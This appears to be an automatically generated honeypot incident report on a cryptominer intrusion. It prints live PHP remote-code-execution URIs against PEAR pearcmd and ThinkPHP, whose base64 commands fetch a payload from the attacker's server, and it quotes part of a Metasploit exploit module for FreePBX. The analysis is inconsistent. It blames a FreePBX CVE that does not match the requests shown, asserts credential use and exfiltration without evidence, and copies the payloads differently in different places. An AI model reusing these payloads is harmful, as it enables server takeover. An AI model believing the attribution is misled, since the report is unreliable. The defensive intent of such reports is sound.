# HTTP Sessions Analysis

The HTTP requests associated with the Session "Ch5ENP298iuu5k136g" in the attack are as follows:

1. **Request 1:**
   - **URI**: `/index.php?lang=../../../../../../../../usr/local/lib/php/pearcmd&+config-create+/&/<?shell_exec(base64_decode("bWtkaXIgLXAgL3RtcC8kKHdob2FtaSkgJiYgY2QgL3RtcC8kKHdob2FtaSk7IHdnZXQgaHR0cDovLzQ1.95.147.236:8080`
   - **User-Agent**: Mozilla/5.0
   - **Host**: 54.67.87.80:8080

3. **Request 3:**
   - **URI**: `/index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=eval&vars[1][]=\\'shell_exec(base64_decode("bWtkaXIgLXAgL3RtcC8kKHdob2FtaSkgJiYgY2QgL3RtcC8kKHdob2FtaSk7IHdnZXQgaHR0cDovLzQ1.95.147.236:8080`
   - **User-Agent**: Mozilla/5.0
   - **Host**: 54.67.87.80:8080

These HTTP requests include URIs that manipulate the `lang` parameter to potentially include and execute remote code (using functions like `shell_exec` and `base64_decode`). The requests are made to the destination IP address 172.31.5.68 over port 8080. The User-Agent headers indicate the request is made from a Mozilla/5.0 compatible client. The attacker is attempting to exploit the PHP PEAR vulnerability to execute unauthorized commands on the target system.

These requests are indicative of the attacker attempting to exploit the PHP PEAR vulnerability to include and execute malicious code, highlighting the malicious intent and active intrusion attempts during the attack.

The HTTP requests observed in the attack provide insights into the attacker's tactics and the functions performed in the context of the attack. Here is an analysis of the HTTP requests and their functions:

1. **HTTP Request 1:**
   - **URI:** `/index.php?lang=../../../../../../../../usr/local/lib/php/pearcmd&+config-create+/&/<?shell_exec(base64_decode("bWtkaXIgLXAgL3RtcC8kKHdob2FtaSkgJiYgY2QgL3RtcC8kKHdob2FtaSk7IHdnZXQgaHR0cDovLzQ5.95.147.236:8080`
   - **Function:** This URI manipulates the `lang` parameter to potentially perform local file inclusion and execute shell commands. The function `shell_exec` with `base64_decode` is used with a base64-encoded command to execute arbitrary code.

2. **HTTP Request 2:**
   - **URI:** `/index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=eval&vars[1][]=\\'shell_exec(base64_decode("bWtkaXIgLXAgL3RtcC8kKHdob2FtaSkgJiYgY2QgL3RtcC8kKHdob2FtaSk7IHdnZXQgaHR0cDovLzQ5.95.147.236:8080`
   - **Function:** This URI attempts to call user-defined functions dynamically for evaluation. The function `eval` is used with encoded shell commands to execute arbitrary code similarly to the first HTTP request.

### Analysis:
- The attacker leverages HTTP requests with crafted URIs to exploit vulnerabilities such as local file inclusion and code execution.
- By manipulating parameters and functions like `shell_exec` and `eval`, the attacker aims to execute arbitrary commands on the target system.
- The attacker's actions indicate an attempt to upload and execute remote code from the specified URI, potentially leading to unauthorized access and control over the target system.

In summary, the HTTP requests observed in the attack serve as the delivery mechanism for executing malicious commands on the target system, highlighting the attacker's intent to compromise the system and perform unauthorized activities.

# Malware OSINT

Based on the information gathered from MalwareBazaar, ThreatFox, URLhaus, and Malpedia, the attacker seems to be leveraging malware associated with XMRig for this attack:

1. **XMRig** is a completely legitimate open-source application known for mining Monero cryptocurrency by making use of system CPUs. However, it has been misused by cybercriminals to generate revenue by infiltrating structured systems without users' consent. This deceptive marketing technique is often referred to as "bundling." Further, the application's bundling is frequently used by potentially unwanted programs (PUAs) that bring about intrusive ads and collect sensitive data.

The threat intelligence from ThreatFox reveals that `45.95.147.236`, is identified as the malicious IP address delivering the XMRig payloads. Various URLs associated with this IP function as malware distribution servers for payload delivery. They deliver versions of the XMRig malware that are tailored for different system architectures (`redtail.amd64`, `redtail.x86_64`, `redtail.arm8`, `redtail.arm7`, etc.), delivered through the `/download/` path on the attacker's server. This suggests that the attacker is well-equipped and prepared to target a wide range of systems.

In terms of IOC (Indicators of Compromise), we have:
- IP: `45.95.147.236`
- Hash: `7103392679c35b6be9c27536e5023eb7`
- URL: `http://45.95.147.236/download/redtail.amd64`

To counter such threats, it is critical to have robust security measures in place, such as regular system and software updates, strong intrusion detection and prevention systems, and user awareness regarding suspicious activities.

# Which vulnerability does the attack attempt to exploit?
The attack exploits a vulnerability found in FreePBX version 2.9, 2.10, and 2.11. In these versions, it's possible to inject arbitrary PHP functions and commands in the "/admin/config.php" parameters "function" and "args".

This vulnerability is identified as **CVE-2014-1903**, titled "FreePBX config.php Remote Code Execution". Exploit code for this vulnerability is available on ExploitDB as [exploit id 32512](https://www.exploit-db.com/exploits/32512). However, the actual technical detail of the code execution mechanism can be quite complex.

Here is an example of the exploit code used, which is a Metasploit module written in Ruby:

```ruby
require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient

    ...

  def exploit
    rand_data = rand_text_alpha_lower(rand(10) + 5)

    print_status("#{peer} - Sending payload")
    res = send_request_cgi({
      'method' => 'GET',
      'uri'    => normalize_uri(target_uri.path, "admin", "config.php"),
      'vars_get' => {
        "display" => rand_data,
        "handler" => "api",
        "function" => datastore['PHPFUNC'],
        "args" => payload.encoded
      }
    })

    ...
  end
end
```

The module requires `Msf::Exploit::Remote::HttpClient` because it sends an HTTP GET request to the FreePBX 'config.php' file with a payload that runs arbitrary commands on the server. The `payload.encoded` represents the actual exploit command to execute, which has been encoded to avoid detection filters.

This code exploits a feature in FreePBX that lets developers run custom functions and commands through parameters on the `config.php` page. In a nutshell, the attacker is abusing this feature to run their own, arbitrary commands remotely, effectively taking control of the system.


# MITRE ATT&CK
Analyzing the attack based on the MITRE ATT&CK matrix, it can be classified under the following technique categories:

1. **T1190 Exploit Public-Facing Application**: The attacker is exploiting a vulnerability in a publicly accessible application, specifically targeting the FreePBX using the CVE-2014-1903 exploit. They use this vulnerability to execute arbitrary PHP commands on the server.

2. **T1078 Valid Accounts**: Using default credentials provided by FreePBX, the attacker logs in to the system.

3. **T1059 Command and Scripting Interpreter**: The attacker uses PHP, a scripting language, to carry out the attack. They also use a script interpreter for executing the scripts downloaded in the victim’s machine via the HTTP GET request.

4. **T1105 Ingress Tool Transfer**: The attacker tries to download their tools (described as 'redtail' commands, possibly a variant of XMRig cryptocurrency miner) into the compromised server for execution.

5. **T1068 Exploitation for Privilege Escalation**: The attacker leverages the vulnerability in the FreePBX to escalate their privileges on the server and execute the downloaded scripts, potentially gaining command execution capability on the compromised server.

6. **T1041 Exfiltration Over Command and Control Channel**: The obfuscated commands issued to the server can be seen as an attempt to exfiltrate data or maintain persistence on the target system. 

In summary, the attack uses common techniques such as Command and Scripting Interpretation, Ingress Tool Transfer, and Exfiltration Over Command and Control Channel, consistent with standard practices in MITRE's ATT&CK matrix. Individual techniques are based on analyzing the attackers' actions and goals.

# What Is The Goal Of The Attack?
The main goal of the attack is to exploit a known vulnerability (CVE-2014-1903) of FreePBX to gain control of the server via remote code execution. Once gaining control, the attacker carries out the following malicious activities:

1. **Deploying Cryptocurrency Miner:** The files that are downloaded seem to be related to "redtail", which could be a type of Monero cryptocurrency miner. The fact that the attacker downloads different versions of the miner (AMD64 and X86_64) suggests that they try to cover different types of server architectures to maximize their chances of successfully mining cryptocurrency. 

2. **Creating a Connection with the Attacker's Server:** The attackers are trying to create an outbound connection (shown by the command with "ohhellohttpserver") from the victim's server to gain persistence and possibly exfiltrate data. The exact function of this connection may only be known by fully analyzing the specifics of the "ohhellohttpserver".

3. **Establishing Persistence:** The attacker places the downloaded files in the /tmp/ directory and executes them, possibly trying to maintain persistence by keeping the cryptocurrency mining operation running on the compromised server.

Overall, the main objectives of this attack are unauthorized access, deployment of a cryptocurrency miner, and potential data exfiltration.

# If The System Is Vulnerable, Would The Attack Will Be Successful?
Yes, if the system is vulnerable (running a susceptible version of FreePBX and having not applied the necessary patches to fix the reported CVE-2014-1903 vulnerability) and not equipped with advanced threat detection systems that can identify and block such attacks, then the attack would likely be successful.

With successful exploitation, the attacker can execute arbitrary PHP commands, which can result in remote code execution (RCE). Not only could this enable the attacker to install and run a cryptocurrency miner on the compromised system, but it could also give the attacker control over the system, allowing them to perform a variety of malicious activities – from data theft to further spreading of malware.

Also, it's worth noting that firewalls or security solutions identifying high CPU usage (caused by the cryptocurrency miner) or suspicious network connections to attacker-controlled servers could alert about and possibly impede such attacks.

# How Can A System Be Protected From This Attack?
Protecting a system from this type of attack involves several layers of security measures:

1. **Update and Patching:** The most important step is to keep all systems, especially publicly accessible ones like FreePBX, up to date. In the case of known vulnerabilities like CVE-2014-1903, patches should be applied promptly to mitigate the vulnerability.

2. **Monitoring and Intrusion Detection Systems:** Use intrusion detection systems (IDS) and network monitoring tools to detect any unusual activities or traffic patterns. In this case, excessive outbound HTTP requests or increased CPU usage (due to cryptocurrency mining) could be indicators of an attack.

3. **Antivirus and Anti-Malware Software:** These tools can help detect and prevent many types of malware, including cryptocurrency miners.

4. **Harden System Configuration:** Limit and secure remote access options. Disable unnecessary services, closely control administrative permissions, and use complex, unique passwords to reduce the attack surface.

5. **Firewalls:** Implementing a proper firewall rule set can help in reducing unauthorized access over the network by blocking inbound traffic that has not been expressly permitted.

6. **Security Audits and Regular Scanning:** Regularly scan the system for vulnerabilities using automated security auditing tools and patch them as soon as they are identified.

7. **User Training:** Users managing the system should be aware of threats and the importance of security protocols like not opening suspicious emails or downloading untrusted attachments.

By enforcing these methods, it is possible to reduce the likelihood of such attacks succeeding and help maintain the security of systems and networks.

# What Are The Indicators Of Compromise (Iocs) For This Attack?
The indicators of compromise (IOCs) for this attack are:

1. **IP Addresses:** The source IP addresses involved in the attack, particularly `45.95.147.236` which is not only connected to but also attempts to download malicious scripts from.

2. **Hashes:** The hash `7103392679c35b6be9c27536e5023eb7` is associated with the malicious file downloaded during the attack.

3. **HTTP Requests:** The unusual HTTP GET requests to the `config.php` file with parameters `function` and `args` followed by encoded commands.

4. **PHP Files:** A suspicious file `pearcmd.php` receiving HTTP requests with parameters meant for command execution on the server.

5. **Downloaded Files:** Files named `b.sh` being created in the `/tmp/` directory and their respective content, especially the `redtail.amd64` and `redtail.x86_64` scripts.

6. **System Behavior Changes:** High CPU usage or network traffic due to activities such as cryptocurrency mining or outbound HTTP requests to the attacker-controlled server `http://45.95.147.236/ohhellohttpserver`.

These IOCs can be used to compare with network logs, server logs, or on the compromised system to detect the presence of an intrusion or an ongoing attack.
